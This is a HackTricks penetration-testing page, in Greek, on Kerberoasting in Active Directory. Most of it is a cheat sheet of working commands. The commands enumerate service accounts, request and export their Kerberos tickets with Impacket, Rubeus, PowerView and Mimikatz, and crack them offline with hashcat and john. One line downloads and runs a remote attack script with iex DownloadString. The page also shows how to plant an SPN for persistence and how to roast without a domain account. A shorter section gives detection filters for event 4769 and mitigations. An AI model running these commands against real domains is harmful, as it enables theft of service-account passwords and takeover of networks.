# Kerberoast

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα αποθετήρια του [**HackTricks**](https://github.com/carlospolop/hacktricks) και του [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Kerberoast

Το Kerberoasting επικεντρώνεται στην απόκτηση **TGS εισιτηρίων**, ειδικά αυτών που σχετίζονται με υπηρεσίες που λειτουργούν υπό **λογαριασμούς χρηστών** στο **Active Directory (AD)**, εξαιρώντας τους **λογαριασμούς υπολογιστών**. Η κρυπτογράφηση αυτών των εισιτηρίων χρησιμοποιεί κλειδιά που προέρχονται από **κωδικούς πρόσβασης χρηστών**, επιτρέποντας τη δυνατότητα **αποκρυπτογράφησης εξω σύνδεσης**. Η χρήση ενός λογαριασμού χρήστη ως υπηρεσία υποδεικνύεται από μια μη κενή ιδιότητα **"ServicePrincipalName"**.

Για την εκτέλεση του **Kerberoasting**, είναι απαραίτητος ένας λογαριασμός τομέα που μπορεί να ζητήσει **TGS εισιτήρια**· ωστόσο, αυτή η διαδικασία δεν απαιτεί **ειδικά προνόμια**, καθιστώντας την προσβάσιμη σε οποιονδήποτε με **έγκυρα διαπιστευτήρια τομέα**.

### Κύρια Σημεία:

* Το **Kerberoasting** στοχεύει σε **TGS εισιτήρια** για **υπηρεσίες λογαριασμών χρηστών** εντός του **AD**.
* Τα εισιτήρια που κρυπτογραφούνται με κλειδιά από **κωδικούς πρόσβασης χρηστών** μπορούν να **αποκρυπτογραφηθούν εξω σύνδεσης**.
* Μια υπηρεσία αναγνωρίζεται από ένα **ServicePrincipalName** που δεν είναι κενό.
* Δεν απαιτούνται **ειδικά προνόμια**, μόνο **έγκυρα διαπιστευτήρια τομέα**.

### **Επίθεση**

{% hint style="warning" %}
Τα **εργαλεία Kerberoasting** συνήθως ζητούν **`RC4 κρυπτογράφηση`** κατά την εκτέλεση της επίθεσης και την έναρξη αιτημάτων TGS-REQ. Αυτό συμβαίνει επειδή το **RC4 είναι** [**ασθενέστερο**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) και πιο εύκολο να αποκρυπτογραφηθεί εξω σύνδεσης χρησιμοποιώντας εργαλεία όπως το Hashcat από άλλους αλγόριθμους κρυπτογράφησης όπως το AES-128 και το AES-256.\
Οι κατακερματισμοί RC4 (τύπος 23) ξεκινούν με **`$krb5tgs$23$*`** ενώ οι AES-256 (τύπος 18) ξεκινούν με **`$krb5tgs$18$*`**`.
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
Εργαλεία με πολλαπλές λειτουργίες περιλαμβάνουν ένα αποθετήριο χρηστών που μπορούν να υποστούν Kerberoast.
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **Απαριθμήστε τους χρήστες που μπορούν να υποστούν Kerberoast**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **Τεχνική 1: Ζητήστε TGS και ανακτήστε το από τη μνήμη**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **Τεχνική 2: Αυτόματα εργαλεία**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
Όταν ζητείται ένα TGS, δημιουργείται το γεγονός του Windows `4769 - Ζητήθηκε ένα εισιτήριο υπηρεσίας Kerberos`.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

### Αποκωδικοποίηση
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Διατήρηση

Εάν έχετε **επαρκή δικαιώματα** πάνω σε έναν χρήστη, μπορείτε να τον **κάνετε kerberoastable**:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
Μπορείτε να βρείτε χρήσιμα **εργαλεία** για επιθέσεις **kerberoast** εδώ: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Αν αντιμετωπίζετε αυτό το **σφάλμα** από Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** είναι λόγω της τοπικής ώρας σας, πρέπει να συγχρονίσετε τον υπολογιστή με τον DC. Υπάρχουν μερικές επιλογές:

* `ntpdate <IP του DC>` - Αποσυρμένο από το Ubuntu 16.04
* `rdate -n <IP του DC>`

### Αντιμετώπιση

Η επίθεση Kerberoasting μπορεί να πραγματοποιηθεί με υψηλό βαθμό αόρατης λειτουργίας αν είναι εκμεταλλεύσιμη. Για να ανιχνευθεί αυτή η δραστηριότητα, πρέπει να δοθεί προσοχή στο **Security Event ID 4769**, το οποίο υποδεικνύει ότι έχει ζητηθεί ένα εισιτήριο Kerberos. Ωστόσο, λόγω της υψηλής συχνότητας αυτού του συμβάντος, πρέπει να εφαρμοστούν συγκεκριμένα φίλτρα για να απομονωθούν ύποπτες δραστηριότητες:

* Το όνομα υπηρεσίας δεν πρέπει να είναι **krbtgt**, καθώς αυτό είναι ένα φυσιολογικό αίτημα.
* Τα ονόματα υπηρεσιών που τελειώνουν με **$** πρέπει να εξαιρεθούν για να αποφευχθεί η συμπερίληψη λογαριασμών μηχανών που χρησιμοποιούνται για υπηρεσίες.
* Τα αιτήματα από μηχανές πρέπει να φιλτραριστούν αποκλείοντας τα ονόματα λογαριασμών μορφοποιημένα ως **machine@domain**.
* Πρέπει να ληφθούν υπόψη μόνο επιτυχή αιτήματα εισιτηρίων, που αναγνωρίζονται από έναν κωδικό αποτυχίας **'0x0'**.
* **Το πιο σημαντικό**, ο τύπος κρυπτογράφησης του εισιτηρίου πρέπει να είναι **0x17**, ο οποίος χρησιμοποιείται συχνά σε επιθέσεις Kerberoasting.
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
Για να μειώσετε τον κίνδυνο του Kerberoasting:

* Βεβαιωθείτε ότι οι **Κωδικοί Υπηρεσιών Λογαριασμών είναι δύσκολοι να μαντευτούν**, συστήνοντας μήκος πάνω από **25 χαρακτήρες**.
* Χρησιμοποιήστε **Διαχειριζόμενους Λογαριασμούς Υπηρεσιών**, οι οποίοι προσφέρουν οφέλη όπως **αυτόματες αλλαγές κωδικών** και **αναθεωρημένη Διαχείριση Ονομάτων Υπηρεσιών Κύριου (SPN)**, ενισχύοντας την ασφάλεια ενάντια σε τέτοιου είδους επιθέσεις.

Με την εφαρμογή αυτών των μέτρων, οι οργανισμοί μπορούν να μειώσουν σημαντικά τον κίνδυνο που σχετίζεται με το Kerberoasting.

## Kerberoast χωρίς λογαριασμό τομέα

Τον **Σεπτέμβριο του 2022**, ένας νέος τρόπος εκμετάλλευσης ενός συστήματος φέρθηκε στο φως από έναν ερευνητή με το όνομα Charlie Clark, κοινοποιήθηκε μέσω της πλατφόρμας του [exploit.ph](https://exploit.ph/). Αυτή η μέθοδος επιτρέπει την απόκτηση **Εισιτηρίων Υπηρεσιών (ST)** μέσω ενός αιτήματος **KRB\_AS\_REQ**, το οποίο εντυπωσιακά δεν απαιτεί έλεγχο επί κάποιου λογαριασμού Active Directory. Κατά βάση, αν ένας πρωταρχικός είναι ρυθμισμένος με τέτοιο τρόπο ώστε να μην απαιτεί προ-πιστοποίηση - ένα σενάριο παρόμοιο με αυτό που είναι γνωστό στον κυβερνοχώρο ως επίθεση **AS-REP Roasting** - αυτό το χαρακτηριστικό μπορεί να αξιοποιηθεί για την παραπλάνηση της διαδικασίας αιτήματος. Συγκεκριμένα, με την τροποποίηση του χαρακτηριστικού **sname** εντός του σώματος του αιτήματος, το σύστημα παραπλανάται ώστε να εκδώσει ένα **ST** αντί για το κανονικό κρυπτογραφημένο Εισιτήριο Χορήγησης Εισιτηρίων (TGT).

Η τεχνική εξηγείται πλήρως σε αυτό το άρθρο: [Ανάρτηση ιστολογίου Semperis](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

{% hint style="warning" %}
Πρέπει να παρέχετε μια λίστα χρηστών επειδή δεν έχουμε έγκυρο λογαριασμό για να ερωτήσουμε το LDAP χρησιμοποιώντας αυτήν την τεχνική.
{% endhint %}

#### Linux

* [impacket/GetUserSPNs.py από το PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus από το PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## Αναφορές

* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
